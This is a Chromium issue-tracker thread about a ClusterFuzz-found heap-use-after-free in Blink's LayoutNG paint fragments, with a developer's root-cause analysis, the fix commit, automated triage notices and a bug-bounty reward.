Detailed report: https://clusterfuzz.com/testcase?key=6280200895201280

Job Type: linux_asan_content_shell
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x60e000052680
Crash State:
  blink::NGPaintFragment::PopulateDescendants
  blink::NGPaintFragment::PopulateDescendants
  blink::NGPaintFragment::Create
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_content_shell&range=669169:669170

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6280200895201280

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### ko...@chromium.org (2019-06-21)

There seems to be two problems:

1. <canvas style="display: block"> generates NGPhysicalFragment.IsAtomicInline() is set.
    NG is confused because of crbug.com/567964
2. The test then applies "float: left" to the canvas.
3. Then ComputeMinMax()
    -> Layout() (because !CanUseNewLayout())
    -> RunLegacyLayout() clears NeedsLayout(),
    but does not update CachedLayoutResult because constraint space is intermediate.
4. Layout() runs, but uses CachedLayoutResult because !NeedsLayout().
5. NGPaintFragment thinks it's an atomic inline, and get confused.

1 is easy to fix. 3, I can probably work around, but not sure what the right fix for it. Hopefully someone in cc has ideas?

[Monorail components: -Blink>Paint Blink>Layout]

### cl...@chromium.org (2019-06-21)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Blink>Paint]

### ko...@chromium.org (2019-06-21)

WIP for 1 is at https://chromium-review.googlesource.com/c/chromium/src/+/1670727

I'll look into 3 (RunOldLayout) later tonight.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-06-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/ad884983442eb0636e79654c378a2a575fd7b028

commit ad884983442eb0636e79654c378a2a575fd7b028
Author: Koji Ishii <kojii@chromium.org>
Date: Fri Jun 21 10:03:21 2019

[LayoutNG] Do not set IsAtomicInline() for block-level replaced boxes

This patch fixes |NGPhysicalBoxFragment| produced for block-
level |LayoutReplaced| to have the correct |BoxType()|.

Before this change, it has |IsAtomicInline()| set, due to
crbug.com/567964.

Bug: 976859
Change-Id: I7b2b1ed249cfb98ae32b68ca487a0295b63b4b19
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1670727
Reviewed-by: Morten Stenshorne <mstensho@chromium.org>
Reviewed-by: Emil A Eklund <eae@chromium.org>
Commit-Queue: Koji Ishii <kojii@chromium.org>
Cr-Commit-Position: refs/heads/master@{#671241}

[modify] https://crrev.com/ad884983442eb0636e79654c378a2a575fd7b028/third_party/blink/renderer/core/layout/ng/ng_box_fragment_builder.cc
[modify] https://crrev.com/ad884983442eb0636e79654c378a2a575fd7b028/third_party/blink/renderer/core/layout/ng/ng_physical_box_fragment_test.cc


### ea...@chromium.org (2019-06-21)

Thanks Koji!

### sh...@chromium.org (2019-06-21)

Setting milestone and target because of Security_Impact=Head and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-06-21)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-06-21)

ClusterFuzz testcase 6280200895201280 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_content_shell&range=671240:671241

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### na...@google.com (2019-06-24)

[Empty comment from Monorail migration]

### mb...@google.com (2019-07-17)

[Empty comment from Monorail migration]

### na...@google.com (2019-07-17)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2019-07-17)

Congrats! The Panel decided to reward $3,000 for this report!

### na...@google.com (2019-07-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-09-27)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/976859?no_tracker_redirect=1

[Multiple monorail components: Blink>Layout, Blink>Paint]
[Monorail mergedwith: crbug.com/chromium/977270]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095442)*
